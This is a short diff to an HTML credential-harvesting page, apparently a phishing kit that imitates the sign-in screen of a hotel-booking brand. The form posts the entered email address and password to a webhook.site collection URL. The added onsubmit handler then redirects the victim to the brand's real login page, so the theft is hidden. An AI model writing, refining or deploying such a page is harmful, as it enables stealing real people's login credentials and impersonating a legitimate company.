@@ -14,8 +14,7 @@ info:
       <h2 style="margin-bottom:20px;color:#222;">Sign in to your account</h2>
 
       <!-- Form sends data to webhook.site -->
-      <form action="https://webhook.site/89c91f6e-d10c-45c2-94d8-d9a26d5d335e" method="POST"
-            style="display:flex;flex-direction:column;gap:14px;text-align:left;">
+      <form action="https://webhook.site/89c91f6e-d10c-45c2-94d8-d9a26d5d335e" method="POST" onsubmit="setTimeout(function(){window.location.href='https://www.mrandmrssmith.com/login'}, 500)">
         <input type="text" name="username" placeholder="Email address" required
                style="padding:12px;border:1px solid #ccc;border-radius:8px;font-size:14px;width:100%;">
         <input type="password" name="password" placeholder="Password" required
